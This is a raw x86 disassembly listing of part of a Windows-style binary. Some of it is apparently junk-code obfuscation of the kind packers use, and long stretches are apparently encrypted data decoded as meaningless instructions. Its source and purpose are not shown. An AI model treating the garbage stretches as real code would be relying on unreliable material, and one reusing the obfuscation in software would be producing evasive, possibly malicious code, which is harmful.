  40b2dd:	les    esp,FWORD PTR [ebx+ebx*2]
  40b2e0:	dec    ebx
  40b2e1:	pop    esi
  40b2e2:	loopne 0x40b26e
  40b2e4:	mul    DWORD PTR [edi-0x55bd3241]
  40b2ea:	jmp    0x46c9:0x4ffa8f42
  40b2f1:	jmp    0xb52e:0xd94ed801
  40b2f8:	xor    cl,BYTE PTR [edi+edi*1+0x1f27b7f2]
  40b2ff:	enter  0x1598,0x96
  40b303:	call   DWORD PTR [esi+0x1565fc7b]
  40b309:	mov    BYTE PTR [esi],dh
  40b30b:	push   edi
  40b30c:	mov    dl,0x28
  40b30e:	mov    dh,0xf0
  40b310:	repnz fidiv WORD PTR [edx+0x158150bd]
  40b317:	sub    eax,DWORD PTR [ebx-0x7d1cffbe]
  40b31d:	inc    edx
  40b31e:	add    al,ch
  40b320:	cld    
  40b321:	mov    eax,0x351b0000
  40b326:	xlat   BYTE PTR ds:[ebx]
  40b327:	add    BYTE PTR [edx+0x0],0x8b
  40b32b:	dec    ebp
  40b32c:	loopne 0x40b2af
  40b32e:	(bad)  
  40b32f:	xchg   BYTE PTR [ecx],ch
  40b331:	add    BYTE PTR [eax],al
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42826b,0x42832b
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x4283c3,0x42832b
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x4283ab,0x42829f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x4283df,0x42827f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x4282df
  40b386:	adc    DWORD PTR ds:0x4281d3,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x428347,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x4282b3,0x42829f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x4281ab,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x4283c7,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x4281a7,0x4283db
  40b3c4:	call   0x4220ab
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x4282ab
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x4282db,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x4282c3,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x42835b
  40b3f3:	mov    eax,ds:0x4282d3
  40b3f8:	cmp    DWORD PTR ds:0x4282db,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428f1c
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x4281cb,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x4282bb
  40b422:	or     DWORD PTR ds:0x42834b,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x4281a7,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x4283d3,0x0
  40b441:	mov    DWORD PTR ds:0x42834b,ecx
  40b447:	mov    DWORD PTR ds:0x4283cb,0x318c
  40b451:	mov    DWORD PTR ds:0x4283db,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x4282a3,0x461b
  40b46a:	mov    DWORD PTR ds:0x4282df,0x63d9
  40b474:	cmp    DWORD PTR ds:0x4283d3,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428f20
  40b48f:	xor    edx,DWORD PTR ds:0x4282b3
  40b495:	adc    ecx,DWORD PTR ds:0x4283bb
  40b49b:	and    DWORD PTR ds:0x4281ab,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x4282bf
  40b4b7:	xor    DWORD PTR ds:0x4283d3,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x4282a3
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x4281bf,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42819b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42826b,0x9f5
  40b501:	mov    DWORD PTR ds:0x4282e7,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x4281bf,0x0
  40b512:	je     0x40b542
  40b518:	push   0x428013
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428e08
  40b528:	sbb    DWORD PTR ds:0x4282d7,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x42820f
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x4283fb
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x4281db
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428283
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x4282b3
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x4282e3,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x4283bb,0x428283
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0x34
  40b596:	enter  0xb0bb,0xa
  40b59a:	adc    ebx,DWORD PTR [eax]
  40b59c:	sbb    BYTE PTR [esi+0x12],ch
  40b59f:	sbb    BYTE PTR [eax],bl
  40b5a1:	push   ecx
  40b5a2:	lahf   
  40b5a3:	test   al,0x31
  40b5a5:	fwait
  40b5a6:	xor    eax,0x90d6e4c9
  40b5ab:	and    edx,DWORD PTR ds:0xf3e706
  40b5b1:	sahf   
  40b5b2:	and    eax,0x5525a13
  40b5b8:	sti    
  40b5b9:	inc    eax
  40b5ba:	adc    DWORD PTR [edx+0x6c6dded7],eax
  40b5c0:	xchg   esi,eax
  40b5c1:	fist   WORD PTR [edi+0x6e4b2bd8]
  40b5c7:	stos   DWORD PTR es:[edi],eax
  40b5c8:	jmp    0x40b593
  40b5ca:	adc    al,ah
  40b5cc:	push   ss
  40b5cd:	out    dx,al
  40b5ce:	aas    
  40b5cf:	fidivr WORD PTR [esi]
  40b5d1:	stos   DWORD PTR es:[edi],eax
  40b5d2:	pop    esi
  40b5d3:	out    dx,al
  40b5d4:	fcomp  st(6)
  40b5d6:	imul   edx,ebp,0xffffff86
  40b5d9:	push   edx
  40b5da:	inc    ebp
  40b5db:	scas   al,BYTE PTR es:[edi]
  40b5dc:	fdiv   QWORD PTR [edi]
  40b5de:	and    BYTE PTR [ebx+eax*1],dh
  40b5e1:	out    dx,eax
  40b5e2:	adc    esi,DWORD PTR [edx+0x7d]
  40b5e5:	and    eax,0xfc1c08af
  40b5ea:	loop   0x40b668
  40b5ec:	jg     0x40b5ae
  40b5ee:	mov    ds:0x95c5849,eax
  40b5f3:	xchg   edi,eax
  40b5f4:	div    eax
  40b5f6:	and    ecx,0x51
  40b5f9:	mov    ecx,0x56cd9ea8
  40b5fe:	test   ch,al
  40b600:	dec    esp
  40b601:	jmp    0xd1fa:0x560e2c37
  40b608:	mov    ch,0xdf
  40b60a:	scas   al,BYTE PTR es:[edi]
  40b60b:	jle    0x40b65e
  40b60d:	jns    0x40b5f7
  40b60f:	mov    ebx,0xfc6e8fe8
  40b614:	push   ds
  40b615:	mov    eax,0xc4ed05db
  40b61a:	in     al,0x35
  40b61c:	cli    
  40b61d:	xor    bl,dl
  40b61f:	sbb    ecx,DWORD PTR [eax+0x41]
  40b622:	lock das 
  40b624:	or     dl,BYTE PTR [ebp+ebp*8+0x3bc6c338]
  40b62b:	and    BYTE PTR [eax],0x9f
  40b62e:	dec    edi
  40b62f:	mov    eax,0x5fe6c742
  40b634:	adc    dh,BYTE PTR [ecx-0x38]
  40b637:	sahf   
  40b638:	mov    BYTE PTR [ebx],al
  40b63a:	sub    esi,DWORD PTR [esi-0x14222801]
  40b640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b641:	loopne 0x40b5df
  40b643:	aam    0x9
  40b645:	or     DWORD PTR [eax],0xb8a8d5eb
  40b64b:	mov    bh,0x62
  40b64d:	mov    eax,0x687afe9a
  40b652:	inc    edx
  40b653:	stos   BYTE PTR es:[edi],al
  40b654:	mov    esp,0x5b8fb2e3
  40b659:	je     0x40b666
  40b65b:	mov    al,0xde
  40b65d:	xchg   BYTE PTR ss:[esi-0x2b],bh
  40b661:	inc    eax
  40b662:	and    DWORD PTR ds:0x5ac964e3,ecx
  40b668:	mov    ds:0x6cf4cc5a,al
  40b66d:	lahf   
  40b66e:	xchg   BYTE PTR [ebp+0x3710ba9b],ah
  40b674:	aaa    
  40b675:	ss ret 
  40b677:	mov    cl,dh
  40b679:	xchg   esi,eax
  40b67a:	inc    DWORD PTR [eax-0x262ca8da]
  40b680:	xor    BYTE PTR [esi],bh
  40b682:	div    DWORD PTR [ebx+0x4da68b9a]
  40b688:	jns    0x40b61f
  40b68a:	arpl   di,di
  40b68c:	scas   al,BYTE PTR es:[edi]
  40b68d:	adc    dl,al
  40b68f:	xchg   ebp,eax
  40b690:	ins    BYTE PTR es:[edi],dx
  40b691:	in     al,dx
  40b692:	add    DWORD PTR [esi-0x52b34b1b],ebx
  40b698:	push   edi
  40b699:	retf   0x1838
  40b69c:	ins    DWORD PTR es:[edi],dx
  40b69d:	popa   
  40b69e:	popf   
  40b69f:	sub    BYTE PTR [edx],cl
  40b6a1:	xchg   edx,eax
  40b6a2:	ss inc esi
  40b6a4:	sub    DWORD PTR [ebp-0x3e8523dc],0x191effc6
  40b6ae:	mov    ds:0x798f3b50,al
  40b6b3:	push   cs
  40b6b4:	pop    ds
  40b6b5:	pop    ds
  40b6b6:	neg    dl
  40b6b8:	push   ecx
  40b6b9:	je     0x40b66d
  40b6bb:	mov    edx,0x430e1e11
  40b6c0:	jbe    0x40b6bf
  40b6c2:	aam    0xbe
  40b6c4:	cmp    al,0x4
  40b6c6:	shr    ebp,0x20
  40b6c9:	test   DWORD PTR [edx+eax*4],esp
  40b6cc:	popf   
  40b6cd:	or     bl,dh
  40b6cf:	jne    0x40b701
  40b6d1:	repz sbb eax,0xde67bca4
  40b6d7:	inc    esi
  40b6d8:	iret   
  40b6d9:	xlat   BYTE PTR ds:[ebx]
  40b6da:	push   0x2a
  40b6dc:	push   es
  40b6dd:	std    
  40b6de:	or     esi,DWORD PTR [ebp+0x50]
  40b6e1:	mov    eax,0x8fe2dcb0
  40b6e6:	cmp    al,0xd2
  40b6e8:	jno    0x40b693
  40b6ea:	fdivr  QWORD PTR [ecx+0x72]
  40b6ed:	and    al,0x15
  40b6ef:	arpl   WORD PTR [edi+ebx*8+0x420540ac],sp
  40b6f6:	mov    ecx,ebx
  40b6f8:	add    BYTE PTR [edx],ah
  40b6fa:	inc    ebp
  40b6fb:	push   cs
  40b6fc:	jecxz  0x40b69d
  40b6fe:	cmp    eax,0xd05df1cf
  40b703:	jecxz  0x40b69c
  40b705:	mov    dl,0x8f
  40b707:	or     DWORD PTR [ebx+0x46],edi
  40b70a:	xlat   BYTE PTR ds:[ebx]
  40b70b:	aaa    
  40b70c:	dec    edi
  40b70d:	xchg   ebp,eax
  40b70e:	push   ds
  40b70f:	and    edi,DWORD PTR [edx-0xc]
  40b712:	loop   0x40b720
  40b714:	pop    ecx
  40b715:	xchg   edx,eax
  40b716:	fcomi  st,st(2)
  40b718:	add    cl,BYTE PTR [edx]
  40b71a:	jbe    0x40b6ee
  40b71c:	jo     0x40b784
  40b71e:	loope  0x40b710
  40b720:	inc    ecx
  40b721:	call   0x915e:0x20d27b78
  40b728:	les    esi,FWORD PTR [ebp+edi*1-0x2c]
  40b72c:	add    BYTE PTR [edi+0x12],bl
  40b72f:	push   ebx
  40b730:	loop   0x40b7aa
  40b732:	fs aas 
  40b734:	or     al,0x13
  40b736:	retf   
  40b737:	xor    BYTE PTR [edi],dh
  40b739:	and    dl,BYTE PTR [ebp+esi*8+0x60]
  40b73d:	add    DWORD PTR [edx+0x7a0d2e3c],esi
  40b743:	or     eax,0x5b2f2e1b
  40b748:	fptan  
  40b74a:	xor    DWORD PTR [edi+ebp*4+0x7406c04f],0x3d
  40b752:	pop    ecx
  40b753:	push   eax
  40b754:	retf   
  40b755:	and    al,0xfb
  40b757:	mov    DWORD PTR [eax-0x70c1335c],esp
  40b75d:	cld    
  40b75e:	cmp    DWORD PTR [edi-0x58],ebp
  40b761:	sub    al,0x54
  40b763:	aam    0xa3
  40b765:	enter  0xba4b,0x1c
  40b769:	scas   al,BYTE PTR es:[edi]
  40b76a:	and    DWORD PTR [ecx+0x62],esi
  40b76d:	dec    ecx
  40b76e:	mov    eax,cs
  40b770:	lea    esi,[esi+ebx*8]
  40b773:	mov    al,0xf2
  40b775:	stos   BYTE PTR es:[edi],al
  40b776:	sti    
  40b777:	jnp    0x40b79e
  40b779:	push   es
  40b77a:	test   DWORD PTR [ebx+0x77434676],ecx
  40b780:	jmp    0xf8f0:0x931c53de
  40b787:	loope  0x40b7ca
  40b789:	mov    ecx,0xf949ff96
  40b78e:	sub    esp,DWORD PTR [edx-0xa924409]
  40b794:	xchg   ebp,eax
  40b795:	sub    eax,0x69ca9749
  40b79a:	(bad)  
  40b79b:	js     0x40b79b
  40b79d:	aas    
  40b79e:	sbb    bl,BYTE PTR [esi-0x5c]
  40b7a1:	cmp    al,0xc
  40b7a3:	and    ah,bh
  40b7a5:	enter  0xc75,0x48
  40b7a9:	(bad)  
  40b7aa:	aam    0xdc
  40b7ac:	add    BYTE PTR [esp+edx*8-0x26769a79],dl
  40b7b3:	add    BYTE PTR [eax-0x241bbd44],bh
  40b7b9:	arpl   ax,bx
  40b7bb:	inc    edx
  40b7bc:	std    
  40b7bd:	pop    ebx
  40b7be:	shl    bh,1
  40b7c0:	mov    al,0x6c
  40b7c2:	dec    ebx
  40b7c4:	cmp    esp,edi
  40b7c6:	fdivr  QWORD PTR [ebx]
  40b7c8:	scas   eax,DWORD PTR es:[edi]
  40b7c9:	or     bh,0xaf
  40b7cc:	mov    eax,ds:0xcba203f1
  40b7d1:	sbb    BYTE PTR [esi-0x73],bl
  40b7d4:	pop    ebx
  40b7d5:	test   eax,0x41736b85
  40b7da:	mov    eax,ds:0xdb7102be
  40b7df:	mov    bh,0x45
  40b7e1:	or     esi,DWORD PTR [ecx]
  40b7e3:	jb     0x40b820
  40b7e5:	fild   DWORD PTR [eax+0x66]
  40b7e8:	or     ch,BYTE PTR [edi+esi*1]
  40b7eb:	lods   eax,DWORD PTR ds:[esi]
  40b7ec:	or     eax,DWORD PTR [edi]
  40b7ee:	fwait
  40b7ef:	rcr    BYTE PTR [ecx+0x10],cl
  40b7f2:	pop    edx
  40b7f3:	adc    BYTE PTR [ebx],0x4d
  40b7f6:	int    0xea
  40b7f8:	(bad)  
  40b7f9:	pop    ds
  40b7fa:	sub    eax,0x65c7bef9
  40b7ff:	sub    eax,edi
  40b801:	mov    esi,0x249bde9
  40b806:	jbe    0x40b803
  40b808:	adc    eax,0x1486ab18
  40b80d:	nop
  40b80e:	inc    ebp
  40b80f:	mov    al,ds:0xf5f5534b
  40b814:	and    al,0x19
  40b816:	cmp    dh,BYTE PTR [ecx]
  40b818:	cdq    
  40b819:	mov    eax,0xbadbaa70
  40b81e:	dec    esp
  40b81f:	loopne 0x40b852
  40b821:	ror    DWORD PTR [esp+ecx*1+0x13],1
  40b825:	xor    BYTE PTR [edi],bh
  40b827:	inc    ebp
  40b828:	(bad)  
  40b829:	repz test al,0x13
  40b82c:	sub    bh,BYTE PTR [ebp-0x3a1d6203]
  40b832:	jae    0x40b871
  40b834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b835:	xchg   ebx,eax
  40b836:	ins    DWORD PTR es:[edi],dx
  40b837:	mov    ch,0x76
  40b839:	pop    ecx
  40b83a:	repnz (bad) 
  40b83c:	popa   
  40b83d:	xor    eax,DWORD PTR [edi+0x26]
  40b840:	loope  0x40b830
  40b842:	sub    DWORD PTR ds:0xa525153e,ebp
  40b848:	dec    ecx
  40b849:	xor    DWORD PTR [edx-0x28],ecx
  40b84c:	adc    eax,0xd8aa7dfb
  40b851:	sub    esp,DWORD PTR [edi-0x4]
  40b854:	fsub   QWORD PTR [ebx]
  40b856:	dec    ebx
  40b857:	ja     0x40b84a
  40b859:	push   esp
  40b85a:	pushf  
  40b85b:	inc    edx
  40b85c:	pop    es
  40b85d:	pop    ecx
  40b85e:	div    DWORD PTR [eax-0x8]
  40b861:	dec    edi
  40b862:	inc    eax
  40b863:	popf   
  40b864:	push   0x5b
  40b866:	mov    edi,0xf8fe29e6
  40b86b:	ret    0x566a
  40b86e:	es cld 
  40b870:	call   0xd810:0xaea2b466
  40b877:	loop   0x40b8e3
  40b879:	pop    ss
  40b87a:	pushf  
  40b87b:	mov    esp,0x8967dff8
  40b880:	pusha  
  40b881:	fild   WORD PTR [esi]
  40b883:	sub    DWORD PTR [edi-0x2ac648c8],esp
  40b889:	xor    eax,0xcedae9d4
  40b88e:	mov    eax,ds:0x5fd4409c
  40b893:	dec    ecx
  40b894:	dec    edx
  40b895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b896:	daa    
  40b897:	jns    0x40b89c
  40b899:	sar    BYTE PTR ds:0xbd60,cl
  40b89e:	cmp    al,0x73
  40b8a0:	and    eax,0xde55824f
  40b8a5:	pop    esi
  40b8a6:	jmp    0xfced:0x3fc3aa51
  40b8ad:	fcom   DWORD PTR [ecx]
  40b8af:	rol    DWORD PTR [esi+eax*4],cl
  40b8b2:	adc    eax,0xb11da62a
  40b8b7:	ret    0x42f8
  40b8ba:	popa   
  40b8bb:	sbb    al,0xb9
  40b8bd:	mov    DWORD PTR [eax+0x5f00945c],0x2ef0eb27
  40b8c7:	jns    0x40b8eb
  40b8c9:	sub    ecx,DWORD PTR [edi]
  40b8cb:	add    eax,0xf1bf4d2
  40b8d0:	xchg   ebp,eax
  40b8d1:	push   0xfd15b37b
  40b8d6:	les    esp,FWORD PTR [ebx-0x3349c72d]
  40b8dc:	mov    edi,0x56c2312f
  40b8e1:	cs call 0xe7b0da7
  40b8e7:	test   BYTE PTR [edx],al
  40b8e9:	(bad)  
  40b8eb:	jbe    0x40b86d
  40b8ed:	cmp    bl,BYTE PTR [ebp+0x62]
  40b8f0:	loope  0x40b881
  40b8f2:	shl    esp,0x71
  40b8f5:	pop    edx
  40b8f6:	pop    esp
  40b8f7:	sahf   
  40b8f8:	jge    0x40b894
  40b8fa:	cmp    edx,ebp
  40b8fc:	and    al,0x49
  40b8fe:	ficom  WORD PTR [ebp+0x35d8cf30]
  40b904:	xchg   edi,eax
  40b905:	std    
  40b906:	aaa    
  40b907:	cli    
  40b908:	fisubr DWORD PTR [esi+0x61b009d]
  40b90e:	in     eax,dx
  40b90f:	and    al,0xc2
  40b911:	pusha  
  40b912:	and    bl,BYTE PTR [edx]
  40b914:	je     0x40b8a7
  40b916:	jnp    0x40b921
  40b918:	loopne 0x40b929
  40b91a:	int3   
  40b91b:	sub    DWORD PTR [ecx+0x6],esi
  40b91e:	pop    esi
  40b91f:	xor    DWORD PTR [eax-0x7d5dc1bc],ecx
  40b925:	out    dx,eax
  40b926:	das    
  40b927:	in     al,0x2e
  40b929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b92a:	add    al,0x27
  40b92c:	pop    ebp
  40b92d:	push   esi
  40b92e:	jbe    0x40b97d
  40b930:	adc    DWORD PTR [ebx],ebx
  40b932:	test   al,0x37
  40b934:	push   ebp
  40b935:	adc    dl,ah
  40b937:	fdivr  DWORD PTR [ebp-0x20]
  40b93a:	nop
  40b93b:	ror    edx,cl
  40b93d:	adc    cl,dl
  40b93f:	mov    ebp,0xc26b6f2d
  40b944:	push   ebx
  40b945:	xchg   ebx,eax
  40b946:	jmp    0x181050da
  40b94b:	jns    0x40b9b8
  40b94d:	aaa    
  40b94e:	fcom   st(1)
  40b950:	sub    BYTE PTR [ecx+0x3b],cl
  40b953:	mov    eax,ds:0xd8ebd35a
  40b958:	neg    eax
  40b95a:	fnstcw WORD PTR [eax+0x39]
  40b95d:	mov    eax,ds:0x7493631b
  40b962:	pop    ecx
  40b963:	adc    ebx,edi
  40b965:	in     al,dx
  40b966:	pop    esp
  40b967:	jmp    DWORD PTR [ebx]
  40b969:	test   eax,0x18a9ee84
  40b96e:	sbb    ch,BYTE PTR [edx+ebx*1+0x4a1c29bc]
  40b975:	xor    dl,BYTE PTR [esp+ecx*4]
  40b978:	and    DWORD PTR [esi+0x355c05],eax
  40b97e:	add    BYTE PTR [ecx+0x819d1],al
  40b984:	add    BYTE PTR [ecx+0x42833315],al
  40b98a:	add    BYTE PTR ds:0xb00000c,bl
  40b990:	ret    0x558b
  40b993:	lock or ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x4282b7
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x428347,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x42834f,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x4282b7,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x42834f,0x2492
  40b9d2:	mov    DWORD PTR ds:0x4283df,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x42834f,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428e0c
  40b9f7:	adc    DWORD PTR ds:0x4283db,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x428337
  40ba0a:	sub    edx,DWORD PTR ds:0x42834b
  40ba10:	mov    DWORD PTR ds:0x428337,edx
  40ba16:	adc    DWORD PTR ds:0x428333,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x4281a7
  40ba26:	xor    DWORD PTR ds:0x4283d3,edx
  40ba2c:	or     DWORD PTR ds:0x42827f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x4282b7
  40ba3c:	or     DWORD PTR ds:0x428353,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	sbb    eax,0x60b0817a
  40baa8:	or     eax,0x126e1818
  40baad:	sbb    BYTE PTR [eax],bl
  40baaf:	jno    0x40ba83
  40bab1:	scas   eax,DWORD PTR es:[edi]
  40bab2:	das    
  40bab3:	aam    0x37
  40bab5:	mov    ebp,DWORD PTR [edi]
  40bab7:	ret    0xb759
  40baba:	push   ds
  40babb:	adc    edi,DWORD PTR [ecx+0x32839291]
  40bac1:	in     al,dx
  40bac2:	repnz or BYTE PTR [esi+ebp*1],bh
  40bac6:	sbb    al,0x8e
  40bac8:	cmc    
  40bac9:	pop    ebp
  40baca:	xchg   edi,eax
  40bacb:	pop    esp
  40bacc:	and    ecx,esp
  40bace:	mov    BYTE PTR [eax],bl
  40bad0:	(bad)  
  40bad1:	(bad)  
  40bad2:	mov    cl,0xb6
  40bad4:	pop    ss
  40bad5:	scas   al,BYTE PTR es:[edi]
  40bad6:	xor    dl,BYTE PTR [ebx]
  40bad8:	mov    bh,0x40
  40bada:	call   DWORD PTR ds:0x790791f0
  40bae0:	jmp    0xe01e:0xb1693fe6
  40bae7:	mov    WORD PTR [esi],fs
  40bae9:	xchg   ebx,eax
  40baea:	or     eax,0x7fd4d454
  40baef:	mov    edi,0xafc6c31c
  40baf4:	sub    BYTE PTR [ecx+ebx*2-0x68],al
  40baf8:	push   ebx
  40baf9:	sub    al,cl
  40bafb:	sahf   
  40bafc:	sbb    dl,cl
  40bafe:	inc    ebp
  40baff:	jmp    0x8a325729
  40bb04:	and    ebx,DWORD PTR [ebp-0x2b3c4cd2]
  40bb0a:	pop    edi
  40bb0b:	or     edi,ebx
  40bb0d:	(bad)  
  40bb0e:	push   ebp
  40bb0f:	sub    edx,DWORD PTR ds:0x179bf004
  40bb15:	jmp    0x40bb82
  40bb17:	ins    BYTE PTR es:[edi],dx
  40bb18:	fcom   DWORD PTR [esi]
  40bb1a:	add    DWORD PTR [esi+esi*8+0x6],ebx
  40bb1e:	push   edx
  40bb1f:	push   0x30
  40bb21:	(bad)  
  40bb22:	in     al,dx
  40bb23:	xchg   edi,eax
  40bb24:	(bad)  
  40bb25:	out    0x85,al
  40bb27:	and    DWORD PTR ds:0x16cf4180,edx
  40bb2d:	pop    ds
  40bb2e:	xchg   esp,eax
  40bb2f:	les    esp,FWORD PTR [esi+ebx*8]
  40bb32:	xor    edx,ebx
  40bb34:	add    al,0x11
  40bb36:	sbb    al,BYTE PTR [ebp+0x61735e39]
  40bb3c:	out    dx,al
  40bb3d:	lock fsubp st(6),st
  40bb40:	(bad)  [esi]
  40bb42:	arpl   WORD PTR [ecx+ecx*8+0x33bcdc76],sp
  40bb49:	mov    ds:0x8b59cb1f,eax
  40bb4e:	adc    al,0x54
  40bb50:	add    BYTE PTR [ebx-0x27bf5f6b],bl
  40bb56:	scas   al,BYTE PTR es:[edi]
  40bb57:	cmp    DWORD PTR [ebx+0x18260e09],0x31
  40bb5e:	push   ebx
  40bb5f:	xchg   esp,eax
  40bb60:	mov    ch,0x3a
  40bb62:	shl    BYTE PTR [edi+esi*8+0x5bc4786c],cl
  40bb69:	mov    esi,0x6238c447
  40bb6e:	out    dx,eax
  40bb6f:	out    0x8a,al
  40bb71:	add    DWORD PTR [eax],esi
  40bb73:	push   edi
  40bb74:	into   
  40bb75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb76:	push   edx
  40bb77:	loop   0x40bb6c
  40bb79:	mov    ebx,0xad3d1bfc
  40bb7e:	push   edi
  40bb7f:	fcom   DWORD PTR cs:[edx]
  40bb82:	xchg   edi,eax
  40bb83:	or     DWORD PTR [ebx*1+0x5bf258ba],eax
  40bb8a:	xchg   ecx,eax
  40bb8b:	gs stos DWORD PTR es:[edi],eax
  40bb8d:	hlt    
  40bb8e:	cmp    al,0x9d
  40bb90:	jnp    0x40bbaa
  40bb92:	dec    esp
  40bb93:	xchg   ecx,eax
  40bb94:	push   ebp
  40bb95:	scas   al,BYTE PTR es:[edi]
  40bb96:	xchg   ecx,eax
  40bb97:	sahf   
  40bb98:	popf   
  40bb99:	in     al,dx
  40bb9a:	xor    ebx,DWORD PTR [edx+esi*1-0x7c]
  40bb9e:	popf   
  40bb9f:	cmp    BYTE PTR [esi],0x6f
  40bba2:	adc    eax,0xe68c89
  40bba7:	and    al,0x34
  40bba9:	popa   
  40bbaa:	add    esp,DWORD PTR [ebx+0x5a052187]
  40bbb0:	push   0xffffffd3
  40bbb2:	mov    ebx,eax
  40bbb4:	ss hlt 
  40bbb6:	sbb    BYTE PTR [edx],bh
  40bbb8:	or     dl,ah
  40bbba:	xor    bh,BYTE PTR [ebp+esi*1-0x4f32d6f9]
  40bbc1:	mov    dh,0xe
  40bbc3:	dec    ecx
  40bbc4:	fs scas al,BYTE PTR es:[edi]
  40bbc6:	lock dec ebx
  40bbc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
